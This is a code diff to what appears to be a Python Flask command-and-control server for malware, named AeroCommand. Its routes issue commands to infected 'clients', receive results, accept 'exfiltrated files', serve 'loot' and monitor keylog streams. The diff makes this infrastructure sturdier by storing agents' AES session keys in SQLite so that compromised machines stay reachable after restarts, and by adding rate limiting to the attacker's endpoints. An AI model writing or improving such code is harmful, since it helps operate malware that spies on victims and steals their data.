@@ -256,6 +256,13 @@ def init_db():
                 timestamp TEXT
             )
         """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS client_sessions (
+                client_id TEXT PRIMARY KEY,
+                aes_key TEXT NOT NULL,
+                updated_at TEXT NOT NULL
+            )
+        """)
         conn.commit()
 
 def db_save_client(info):
@@ -301,6 +308,45 @@ def db_log_command(client_id, command, output):
     except Exception as e:
         print(f"[!] DB log_command failed: {e}")
         return None
+
+def db_save_session(client_id: str, aes_key: bytes):
+    """Persist AES session key (base64) so restarts keep sessions alive"""
+    try:
+        b64 = base64.b64encode(aes_key).decode()
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with db_connect() as conn:
+            conn.execute("""
+                INSERT INTO client_sessions (client_id, aes_key, updated_at)
+                VALUES (?, ?, ?)
+                ON CONFLICT(client_id) DO UPDATE SET aes_key=excluded.aes_key, updated_at=excluded.updated_at
+            """, (client_id, b64, now))
+            conn.commit()
+    except Exception as e:
+        print(f"[!] DB save_session failed: {e}")
+
+def db_load_sessions() -> dict:
+    """Load all persisted sessions from DB -> {client_id: aes_key_bytes}"""
+    out = {}
+    try:
+        with db_connect() as conn:
+            cur = conn.cursor()
+            cur.execute("SELECT client_id, aes_key FROM client_sessions")
+            for cid, b64 in cur.fetchall():
+                try:
+                    out[cid] = base64.b64decode(b64)
+                except Exception:
+                    continue
+    except Exception as e:
+        print(f"[!] DB load_sessions failed: {e}")
+    return out
+
+def db_delete_session(client_id: str):
+    try:
+        with db_connect() as conn:
+            conn.execute("DELETE FROM client_sessions WHERE client_id=?", (client_id,))
+            conn.commit()
+    except Exception:
+        pass
 
 init_db()
 
@@ -366,9 +412,17 @@ if server_rsa_key is None:
 
 server_rsa_public = server_rsa_key.publickey().export_key().decode()
 
-# Client session keys mapping: client_id -> 32-byte AES key
+# Client session keys mapping: client_id -> 32-byte AES key (persisted to SQLite)
 client_sessions = {}
 session_lock = threading.Lock()
+# Hydrate from DB so restarts don't invalidate existing agents
+try:
+    _loaded = db_load_sessions()
+    if _loaded:
+        client_sessions.update(_loaded)
+        print(f"[+] Restored {len(_loaded)} persisted session key(s) from DB")
+except Exception as _e:
+    print(f"[!] Session restore failed: {_e}")
 
 def encrypt_aes(data: str, aes_key: bytes) -> str:
     """Encrypt string with AES-256-GCM and return base64 encoded payload (nonce + tag + ciphertext)"""
@@ -411,6 +465,7 @@ def decrypt_payload(client_id=None):
             if cid:
                 with session_lock:
                     client_sessions[cid] = aes_key
+                db_save_session(cid, aes_key)
                 print(f"[+] AES session key established for client: {cid}")
             return inner_payload
         except Exception as e:
@@ -468,6 +523,56 @@ HEARTBEAT_TIMEOUT = 60  # seconds — mark client dead if no heartbeat
 _client_connected_event = threading.Event()  # Signals input thread when a client registers
 PROMPT = f"{C.RED}⚡ AeroCommand > {C.RESET}"
 
+# === Rate Limiting (sliding window, in-memory, per-IP) ===
+from collections import deque
+
+_rate_buckets: dict[str, deque] = {}
+_rate_lock = threading.Lock()
+
+def rate_limit(max_requests: int, window_seconds: int):
+    """Sliding-window rate limiter. Key = IP + endpoint. Returns 429 when exceeded."""
+    def decorator(f):
+        @functools.wraps(f)
+        def wrapped(*args, **kwargs):
+            # Operator API uses token bucket per token too; C2 uses per-IP
+            ident = request.headers.get("Authorization", "")[:32] if request.path.startswith("/api/") else ""
+            key = f"{request.remote_addr}:{request.path}:{ident}"
+            now = time.monotonic()
+            with _rate_lock:
+                dq = _rate_buckets.get(key)
+                if dq is None:
+                    dq = deque()
+                    _rate_buckets[key] = dq
+                # evict outside window
+                while dq and dq[0] <= now - window_seconds:
+                    dq.popleft()
+                if len(dq) >= max_requests:
+                    retry_after = int(dq[0] + window_seconds - now) + 1
+                    resp = jsonify({"error": "Rate limit exceeded"})
+                    resp.headers["Retry-After"] = str(retry_after)
+                    return resp, 429
+                dq.append(now)
+                # opportunistic cleanup: drop empty buckets occasionally
+                if len(_rate_buckets) > 2048:
+                    for k in list(_rate_buckets.keys())[:512]:
+                        if not _rate_buckets[k]:
+                            _rate_buckets.pop(k, None)
+            return f(*args, **kwargs)
+        return wrapped
+    return decorator
+
+def _purge_rate_buckets():
+    """Background janitor: drop stale buckets every 5 minutes"""
+    while True:
+        time.sleep(300)
+        now = time.monotonic()
+        with _rate_lock:
+            for k, dq in list(_rate_buckets.items()):
+                while dq and dq[0] <= now - 600:
+                    dq.popleft()
+                if not dq:
+                    _rate_buckets.pop(k, None)
+
 # ========== ROUTES ==========
 
 @app.route("/test", methods=["GET"])
@@ -475,12 +580,14 @@ def test():
     return "SERVER RUNNING OK", 200
 
 @app.route("/rsa_pub", methods=["GET"])
+@rate_limit(30, 60)
 def get_rsa_pub():
     """Provide server RSA public key for client hybrid encryption handshake"""
     return server_rsa_public, 200
 
 
 @app.route("/api/diag", methods=["POST", "OPTIONS"])
+@rate_limit(20, 60)
 @require_auth
 def api_diag():
     """Diagnostic endpoint: attempt to decrypt a registration packet and return detailed errors."""
@@ -523,6 +630,7 @@ def api_diag():
 
 
 @app.route("/register", methods=["POST"])
+@rate_limit(10, 60)
 def register():
     global target_client
     info = decrypt_payload()
@@ -586,6 +694,7 @@ def register():
 
 
 @app.route("/cmd", methods=["GET"])
+@rate_limit(120, 60)
 def get_command():
     client_id = request.args.get("id")
     if not client_id:
@@ -610,6 +719,7 @@ def get_command():
 
 
 @app.route("/result", methods=["POST"])
+@rate_limit(60, 60)
 def post_result():
     # client_id passed as query param by client
     cid_from_param = request.args.get("id")
@@ -682,6 +792,7 @@ def post_result():
 
 
 @app.route("/upload", methods=["POST"])
+@rate_limit(10, 60)
 def upload_file():
     """Receive exfiltrated files from clients"""
     cid_from_param = request.args.get("id")
@@ -737,6 +848,7 @@ def add_cors_headers(response):
 
 
 @app.route("/api/clients", methods=["GET", "OPTIONS"])
+@rate_limit(60, 60)
 @require_auth
 def api_get_clients():
     if request.method == "OPTIONS":
@@ -745,6 +857,7 @@ def api_get_clients():
 
 
 @app.route("/api/logs", methods=["GET", "OPTIONS"])
+@rate_limit(60, 60)
 @require_auth
 def api_get_logs():
     if request.method == "OPTIONS":
@@ -829,6 +942,7 @@ def sse_events():
 
 
 @app.route("/api/send_command", methods=["POST", "OPTIONS"])
+@rate_limit(30, 60)
 @require_auth
 def api_send_command():
     if request.method == "OPTIONS":
@@ -851,6 +965,7 @@ def api_send_command():
 
 
 @app.route("/api/loot", methods=["GET", "OPTIONS"])
+@rate_limit(30, 60)
 @require_auth
 def api_get_loot():
     if request.method == "OPTIONS":
@@ -980,6 +1095,7 @@ def cleanup_dead_clients():
                 del pending_commands[cid]
             with session_lock:
                 client_sessions.pop(cid, None)
+            db_delete_session(cid)
         # Reset target if it was pointing to a dead client
         if target_client in dead:
             target_client = None
@@ -1161,6 +1277,11 @@ if __name__ == "__main__":
     kls_thread = threading.Thread(target=keylog_stream_monitor)
     kls_thread.daemon = True
     kls_thread.start()
+
+    # Rate-limit bucket janitor
+    rl_thread = threading.Thread(target=_purge_rate_buckets)
+    rl_thread.daemon = True
+    rl_thread.start()
 
     # Start interactive input console ONLY if running in an interactive terminal (local TTY)
     if sys.stdin and sys.stdin.isatty():
